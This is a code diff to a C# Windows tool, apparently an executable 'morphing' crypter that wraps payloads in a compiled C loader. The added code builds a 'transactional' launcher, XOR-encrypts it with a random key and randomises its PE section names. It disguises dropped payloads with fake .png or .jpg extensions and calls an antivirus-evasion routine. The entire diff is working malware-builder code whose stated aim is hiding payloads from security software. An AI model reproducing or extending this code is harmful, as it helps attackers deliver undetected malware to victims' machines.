@@ -18,7 +18,7 @@ namespace Exe_Morphing_Util
     public partial class FormMain : Form
     {
         
-        public int payloadcryptkey;
+        public int payloadcryptkey, transactionalkey;
         bool devmode = true;
 
         private static string RandomStringJustChars(int size) // C demands things start with chars not numbers for function names
@@ -623,6 +623,8 @@ namespace Exe_Morphing_Util
             {
                 File.Delete("\\output_dir\\gogopowerrangers.exe");
             }
+            if (File.Exists("\\builder\\transactional_exe.exe"))
+                File.Decrypt("\\builder\\transactional_exe.exe");
             // why not base64 it FIRST, then encrypt it when its in that format, THEN decrypt to b64 and run?
             // no, ENCRYPT FIRST
             // THEN BASE64 ENCODE for storage
@@ -633,6 +635,10 @@ namespace Exe_Morphing_Util
             // B64_payload(Application.StartupPath + "\\builder\\res\\tempload.joe");
             // 
             AV_Evasions();
+            if (rbTransactional.Checked)
+            {
+                compile_transactional_launcher();
+            }
             MakeLoader();
             Process.Start(Application.StartupPath + "\\output_dir\\");
             //AddToIAT(FLSTrick(), tbfilehere.Text);
@@ -692,7 +698,7 @@ namespace Exe_Morphing_Util
                 if (justextract == 1)
                 {   // random exe name between 7 and 12 characters
                     Random rnd = new Random();
-                    replacecrypto = replacecrypto.Replace("imanexechangemealready", RandomString(rnd.Next(7,12)));  
+                    replacecrypto = replacecrypto.Replace("imanexechangemealready", RandomString(rnd.Next(7,12)) + ".png");  // make it an image because lol
                 }
 
                 File.WriteAllText("builder\\joe_crypter.c", replacecrypto);
@@ -919,7 +925,7 @@ namespace Exe_Morphing_Util
             if (which == 1)
             {   // random exe name between 7 and 12 characters
                 Random rnd = new Random();
-                replacecrypto = replacecrypto.Replace("imanexechangemealready", RandomString(rnd.Next(7, 12)));
+                replacecrypto = replacecrypto.Replace("imanexechangemealready", RandomString(rnd.Next(7, 12)) + ".jpg"); // is exe even needed? WinExec doesnt care
             }
 
 
@@ -1132,8 +1138,67 @@ namespace Exe_Morphing_Util
 
 
         }
-    
-        private static void MakeLoader() 
+        private void compile_transactional_launcher()
+        {
+            // transactional file.c should be the same file. maybe i could add some random xor strings?
+            // RtlInitUnicodeString(&ustr, L"fuck it"); // find and replace here random string between 8 and 20 chars
+
+            string compilerexe = "pocc.exe";
+            string rsrcexe = "porc.exe";
+            string linkexe = "polink.exe";
+            string sourcepath = Application.StartupPath + "\\builder\\joe_crypter.c";
+            string objpath = Application.StartupPath + "\\builder\\joe_crypter.obj";
+            // string payloadpath = Application.StartupPath + "\\builder\\res\\pload.joe";
+            // see \builder\payload.rc, points to \\res\\payload.joe
+            string rsrs1 = Application.StartupPath + "\\builder\\payload.rc";
+            string rsrs2 = Application.StartupPath + "\\builder\\payload.res";
+            string finalexe = Application.StartupPath + "\\builder\\transactional_exe.exe";
+
+
+            StreamWriter sw = new StreamWriter(Application.StartupPath + "\\builder\\buildit.bat");
+            sw.WriteLine("@echo off");
+            sw.WriteLine("color 17");
+            sw.WriteLine("set PellesCDir=" + Application.StartupPath + "\\compiler");
+            sw.WriteLine("set PATH=%PellesCDir%\\Bin;%PATH%");
+            sw.WriteLine("set INCLUDE=%PellesCDir%\\Include;%PellesCDir%\\Include\\Win;%INCLUDE%");
+            sw.WriteLine("set LIB=%PellesCDir%\\Lib;%PellesCDir%\\Lib\\Win;%LIB%");
+
+            // compile -std:C11 -Tx86-coff -Os -Ox -Ob0 -fp:precise -W0 -Gz -Ze
+            sw.WriteLine(compilerexe + " -std:C11 -Tx86-coff -Os -Ox -Ob0 -fp:precise -W0 -Gz -Ze \"" + sourcepath + "\" -Fo\"" + objpath + "\""); // changed to no warnings. smaller code
+                                                                                                                                                   // resources
+            sw.WriteLine(rsrcexe + " \"" + rsrs1 + "\" -Fo\"" + rsrs2 + "\"");
+            // link
+            sw.WriteLine(linkexe + " -subsystem:windows -machine:X86 -largeaddressaware " +
+                "-base:0x10000 kernel32.lib user32.lib gdi32.lib comctl32.lib comdlg32.lib Rpcrt4.lib " +
+                "winmm.lib oleaut32.lib ole32.lib wbemuuid.lib Advapi32.lib -out:\"" + finalexe + "\" \"" + objpath + "\" \"" + rsrs2 + "\"");
+            sw.WriteLine("\r\n");
+            /*
+            sw.WriteLine(":::       _             _____                  _            ");
+            sw.WriteLine(":::      | |           / ____|                | |           ");
+            sw.WriteLine(":::      | | ___   ___| |     _ __ _   _ _ __ | |_ ___ _ __ ");
+            sw.WriteLine(":::  _   | |/ _\\ / _\\ |    | '__| | | | '_\\| __/ _\\ '__|");
+            sw.WriteLine("::: | |__| | (_) |  __/ |____| |  | |_| | |_) | ||  __/ |   ");
+            sw.WriteLine("::: \\____/\\___/\\___|\\____|_|  \\__, | .__/\\_\\___|_|   ");
+            sw.WriteLine(":::                                 __/ | |                 ");
+            sw.WriteLine(":::                                |___/|_|                 ");
+            sw.WriteLine(":::                                                         ");
+            sw.WriteLine("for /f \"delims =: tokens = *\" %%A in ('findstr /b ::: \" % ~f0\"') do @echo(%%A");
+            */
+            sw.WriteLine("echo Payload sucessfully built and saved to " + finalexe);
+            sw.WriteLine("pause");
+            sw.Close();
+
+            // run it
+            System.Diagnostics.Process batfile = new System.Diagnostics.Process();
+            batfile.StartInfo.FileName = Application.StartupPath + "\\builder\\buildit.bat";
+
+            //batfile.StartInfo.CreateNoWindow = true;
+            //batfile.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            batfile.Start();
+
+            crypt_transact_launcher(finalexe);
+        }
+            private void MakeLoader() 
         {
             // first cc, then rc, then link
 
@@ -1151,7 +1216,12 @@ namespace Exe_Morphing_Util
             string sourcepath = Application.StartupPath + "\\builder\\joe_crypter.c";
             string objpath = Application.StartupPath + "\\builder\\joe_crypter.obj";
             // string payloadpath = Application.StartupPath + "\\builder\\res\\pload.joe";
-            // see \builder\payload.r, points to \\res\\payload.joe
+            // see \builder\payload.rc, points to \\res\\payload.joe
+            if(rbTransactional.Checked)
+            {
+                // set payload.res to include transactional.joe
+                // \\builder\\res\\transactional.joe
+            }
             string rsrs1 = Application.StartupPath + "\\builder\\payload.rc";
             string rsrs2 = Application.StartupPath + "\\builder\\payload.res";
             string finalexe = Application.StartupPath + "\\output_dir\\gogopowerrangers.exe";
@@ -1187,11 +1257,8 @@ namespace Exe_Morphing_Util
             sw.WriteLine("for /f \"delims =: tokens = *\" %%A in ('findstr /b ::: \" % ~f0\"') do @echo(%%A");
             */
             sw.WriteLine("echo Payload sucessfully built and saved to " + finalexe);
+            sw.WriteLine("Original EXE unchanged is in the folder you left it as " + tbfilehere.Text + ".bak");
             sw.WriteLine("pause");
-			
-			
-			
-			
             sw.Close();
 
             // run it
@@ -1579,6 +1646,24 @@ namespace Exe_Morphing_Util
 
             File.WriteAllBytes(Application.StartupPath + "\\builder\\res\\pload.joe", resultBuffer);
             payloadcryptkey = keykey;
+
+        }
+        public void crypt_transact_launcher(string filename) // encryted by random key, set at startup.
+        {
+            RandomSectionNames(filename); // make it somewhat different exe before encryption
+
+            Encoding ascii = Encoding.ASCII;
+            Random ran = new Random();
+            int keykey = ran.Next(10000, 99999);
+            byte[] newfile = File.ReadAllBytes(filename);
+            byte[] resultBuffer = new byte[newfile.Length];
+            for (int i = 0; i < newfile.Length; i++)
+            {
+                resultBuffer[i] = (byte)(newfile[i] ^ keykey);
+            }
+
+            File.WriteAllBytes(Application.StartupPath + "\\builder\\res\\transactional.joe", resultBuffer);
+            transactionalkey = keykey;
 
         }
         public static void B64_payload(string filename)
